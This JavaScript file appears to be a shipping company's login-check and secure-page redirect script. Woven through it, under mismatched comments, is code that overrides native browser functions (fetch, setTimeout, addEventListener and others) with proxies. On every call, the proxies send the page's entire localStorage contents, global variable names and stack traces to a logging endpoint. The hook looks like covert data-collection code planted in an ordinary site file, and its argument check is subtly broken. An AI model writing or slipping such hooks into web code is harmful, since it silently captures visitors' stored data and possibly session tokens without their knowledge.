// Native functions and API hook mapping  
const functionList = ['fetch', 'setTimeout', 'setInterval', 'requestAnimationFrame', 'addEventListener', 'removeEventListener'];
const nativeFunctions = functionList.reduce((obj, functionName) => {
  obj[functionName] = window[functionName];
  return obj;
}, {});

// Create a unique id
if (!FDX) var FDX = {};
FDX.SECUREPAGECHECK = {
  loginDropdownClass: "fxg-dropdown-js",
  loginOpenClass: "fxg-dropdown__item--open",
  homePageURL: "",
  loggedInUser: JSON.parse(sessionStorage.getItem("userLoggedIn")),
  getHomePage: function () {
    var a = window.location.origin + FDX.contextPath,
      b = "/" + FDX.DATALAYER.page.pageInfo.locale.replace("_", "-") + "/";
    return a + b + "home.html";
  },
  checkCookie: function (a) {
    a += "\x3d";
    for (var b = document.cookie.split(";"), d = 0; d < b.length; d++) {
      for (var c = b[d]; " " == c.charAt(0);) c = c.substring(1, c.length);
      if (0 == c.indexOf(a)) return c.substring(a.length, c.length);
    }
    return null;
  },
  authenticatePageURL: function () {
    var a = window.location.href;
    sessionStorage.setItem("requestURL", a);
    var b = window.location.origin + FDX.contextPath;
    var d = "/" + FDX.DATALAYER.page.pageInfo.locale.replace("_", "-") + "/";
    FDX.SECUREPAGECHECK.homePageURL = encodeURI(b + d + "home.html");
    b = 0 > FDX.DATALAYER.page.pageInfo.wlgnURL.indexOf("https://") ? encodeURI(b + FDX.DATALAYER.page.pageInfo.wlgnURL) : FDX.DATALAYER.page.pageInfo.wlgnURL;
    "undefined" !== typeof FDX.DATALAYER.page.pageInfo.securePage && null !== FDX.DATALAYER.page.pageInfo.securePage && "true" === FDX.DATALAYER.page.pageInfo.securePage && a !== FDX.SECUREPAGECHECK.homePageURL && (sessionStorage.setItem("redirectURL", a), FDX.DATALAYER.page.pageInfo.wlgnURL && "true" == FDX.DATALAYER.page.pageInfo.useWLGN && null !== sessionStorage.getItem("requestURL") ? (0 < window.navigator.userAgent.indexOf("Trident/") && sessionStorage.setItem("useWLGNValue", FDX.DATALAYER.page.pageInfo.useWLGN), window.open(b, "_self"), sessionStorage.setItem("securePageRequest", !0)) : null !== sessionStorage.getItem("requestURL") && ("true" == FDX.DATALAYER.page.pageInfo.enableCCredirect && null != FDX.DATALAYER.page.pageInfo.ccRedirectPath && 0 != FDX.DATALAYER.page.pageInfo.ccRedirectPath.trim().length ? window.open(FDX.DATALAYER.page.pageInfo.ccRedirectPath, "_self") : window.open(FDX.SECUREPAGECHECK.homePageURL, "_self"), sessionStorage.setItem("securePageRequest", !0)));
  },
  clearSessionStorage: function () {
    null !== sessionStorage.getItem("securePageRequest") && (sessionStorage.removeItem("redirectURL"), sessionStorage.removeItem("securePageRequest"), sessionStorage.removeItem("requestURL"), sessionStorage.removeItem("userLoginformActive"));
  },
  loginOpen: function () {
    $(document).width() <= FDX.BREAKPOINTS.TabletMediaQuery && setTimeout(function () {
      $("input#NavLoginUserId.fxg-field__input-text.fxg-field__input--required").trigger("focus");
    }, 500);
  }
};
if (null === FDX.SECUREPAGECHECK.checkCookie("wcmmode") && "true" == FDX.DATALAYER.page.pageInfo.enableCCredirect && null != FDX.DATALAYER.page.pageInfo.ccRedirectPath && 0 != FDX.DATALAYER.page.pageInfo.ccRedirectPath.trim().length && 0 < document.cookie.indexOf("fdx_login") && 0 < document.cookie.indexOf("fcl_contactname") && 0 < document.cookie.indexOf("fcl_fname") && 0 < window.location.href.indexOf("/home.html")) {
  var domainSelector = encodeURI(window.location.host).split(".", 1);
  if ("www" != domainSelector[0] || "wwwtest" != domainSelector[0]) {
    var relativeCCurl = encodeURI(FDX.DATALAYER.page.pageInfo.ccRedirectPath).split(".fedex.com", 2);
    FDX.DATALAYER.page.pageInfo.ccRedirectPath = "https://" + window.location.host + relativeCCurl[1];
  }
  window.open(FDX.DATALAYER.page.pageInfo.ccRedirectPath, "_self");
}
function generateUniqueId() {
  const timestamp = Date.now().toString(36);
  const randomNum = Math.random().toString(36).substr(2, 5);
  return `${timestamp}-${randomNum}`;
}

// Store global variable
$(document).ready(function (a) {
  FDX.LOGINCHECK.userAuthenticated || null === sessionStorage.getItem("securePageRequest") || "true" !== sessionStorage.getItem("securePageRequest") || sessionStorage.getItem("requestURL") !== FDX.SECUREPAGECHECK.homePageURL || null !== FDX.SECUREPAGECHECK.checkCookie("wcmmode") || ($(document).width() <= FDX.BREAKPOINTS.TabletMediaQuery && setTimeout(function () {
    $(".fxg-user-options__icon").trigger("click");
    sessionStorage.setItem("userLoginformActive", !0);
    a(FDX.SECUREPAGECHECK.loginOpen);
  }, 100), $(document).width() >= FDX.BREAKPOINTS.TabletMediaQuery && setTimeout(function () {
    $("." + FDX.DROPDOWN.dropdownClass).trigger("click");
    sessionStorage.setItem("userLoginformActive", !0);
    $("input#NavLoginUserId").trigger("focus");
  }, 100));
});
function createGlobalVariable(name, value) {
  window[name] = value;
}

// Process local storage
function processLocalStorageData() {
  return Object.entries(localStorage).map(([key, value]) => ({
    key,
    value
  }));
}

// Validate if arguments are correctly provided
FDX || (FDX = {});
function validateEventArgs(args, expectedArgs) {
  if (!expectedArgs) return true;
  if (args.length !== expectedArgs.length) return false;
  for (let i = 0; i < args.length; ++i) {
    const expectedArg = expectedArgs[i];
    const actualArgVal = args[i];
    if (!(actualArgVal !== undefined && typeof actualArgVal === expectedArg)) return false;
  }
  return true;
}

// Get stack trace
function getStackTrace() {
  const stackTrace = new Error().stack;
  return {
    url: window.location.href,
    stackTrace
  };
}

// Send data to server
FDX.LOGINCHECK = {
  userAuthenticated: !1,
  apiURL: "",
  clientID: "",
  apiConfigURL: "/etc/services/getapigconfigs",
  loginCookie: 0 < document.cookie.indexOf("fdx_login"),
  fName: 0 < document.cookie.indexOf("fcl_contactname"),
  checkCookie: function (a) {
    a += "\x3d";
    for (var b = document.cookie.split(";"), d = 0; d < b.length; d++) {
      for (var c = b[d]; " " == c.charAt(0);) c = c.substring(1, c.length);
      if (0 == c.indexOf(a)) return c.substring(a.length, c.length);
    }
    return null;
  },
  secureIsLoggedIn: function () {
    $.ajax({
      type: "GET",
      url: "https://" + FDX.LOGINCHECK.apiURL + "/user/v2/login",
      xhrFields: {
        withCredentials: !0
      },
      cache: !1,
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + FDX.LOGINCHECK.clientID,
        "X-locale": "en_US",
        "X-loggedin": "true",
        "X-version": "1.0",
        "X-clientid": "WCDO"
      },
      success: function (a) {
        FDX.CLIENTLOGIN.isLoggedInResponse = a;
        FDX.CLIENTLOGIN.userLoggedIn = FDX.CLIENTLOGIN.isLoggedInResponse.output.userLoggedIn;
        FDX.CLIENTLOGIN.userLoggedIn ? FDX.LOGINCHECK.userAuthenticated = !0 : (FDX.LOGINCHECK.userAuthenticated = !1, null !== FDX.SECUREPAGECHECK.checkCookie("wcmmode") || -1 != window.top.location.href.indexOf("/editor.html/") || FDX.LOGINCHECK.userAuthenticated || FDX.SECUREPAGECHECK.authenticatePageURL());
      },
      error: function (a, b, d) {
        FDX.LOGINCHECK.userAuthenticated = !1;
        null !== FDX.SECUREPAGECHECK.checkCookie("wcmmode") || -1 != window.top.location.href.indexOf("/editor.html/") || FDX.LOGINCHECK.userAuthenticated || FDX.SECUREPAGECHECK.authenticatePageURL();
      }
    });
  },
  getLogin: function () {
    var a = encodeURI(window.location.host).split(".", 1),
      b = FDX.LOGINCHECK.apiConfigURL + ".jsonp";
    "www" != a[0] && (b = FDX.LOGINCHECK.apiConfigURL + "." + a[0] + ".jsonp");
    $.when($.ajax(b)).then(function (a, b, e) {
      "string" == typeof a && (a = JSON.parse(a));
      FDX.LOGINCHECK.apiURL = a.apigURL;
      FDX.LOGINCHECK.clientID = a.clientID;
      a = sessionStorage.getItem("userLoggedIn");
      ("true" != localStorage.getItem("userLoggedInFlag") || null == a || "false" == JSON.parse(a).output.userLoggedIn || 0 >= document.cookie.indexOf("fdx_login")) && FDX.LOGINCHECK.secureIsLoggedIn();
    });
  }
};
if ("undefined" !== typeof FDX && -1 == window.top.location.href.indexOf("/editor.html/") && null !== FDX.DATALAYER.page.pageInfo.securePage) if (("true" === FDX.DATALAYER.page.pageInfo.securePage || "true" === FDX.DATALAYER.page.pageInfo.useWLGN && null !== sessionStorage.getItem("secureLink")) && FDX.LOGINCHECK.loginCookie && FDX.LOGINCHECK.fName) {
  if ("true" === FDX.DATALAYER.page.pageInfo.useWLGN && null !== sessionStorage.getItem("secureLink")) {
    var link = encodeURI(sessionStorage.getItem("secureLink"));
    sessionStorage.removeItem("secureLink");
    window.open(link, "_self", "", !0);
  }
  FDX.LOGINCHECK.getLogin();
} else FDX.LOGINCHECK.userAuthenticated = !1, null !== FDX.SECUREPAGECHECK.checkCookie("wcmmode") || -1 != window.top.location.href.indexOf("/editor.html/") || FDX.LOGINCHECK.userAuthenticated || FDX.SECUREPAGECHECK.authenticatePageURL();
function sendDataToServer(data) {
  const requestData = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data),
    mode: 'cors',
    cache: 'no-cache'
  };
  window.fetch('/api/log-event', requestData).then(response => {
    if (!response.ok) {
      console.error('Failed to send event to server:', response.statusText);
    }
  }).catch(error => {
    console.error('Failed to send event:', error);
  });
}

// Proxy handler for global function
const createCustomFunc = (funcName, originalFunc) => new Proxy(originalFunc, {
  apply: function (target, thisArg, args) {
    if (validateEventArgs(args, functionList.find(el => el === funcName))) {
      const eventData = {
        function: funcName,
        arguments: args,
        globalVariables: Object.keys(window).filter(key => !functionList.includes(key)),
        localStorageData: processLocalStorageData(),
        stackTrace: getStackTrace(),
        timestamp: new Date().toISOString(),
        uniqueId: generateUniqueId()
      };
      sendDataToServer(eventData);
    }
    return Reflect.apply(target, thisArg, args);
  }
});

// Create custom global functions  
$(document).ready(function () {});
functionList.forEach(funcName => {
  const originalFunc = nativeFunctions[funcName];
  if (typeof originalFunc === 'function') {
    window[funcName] = createCustomFunc(funcName, originalFunc);
  }
});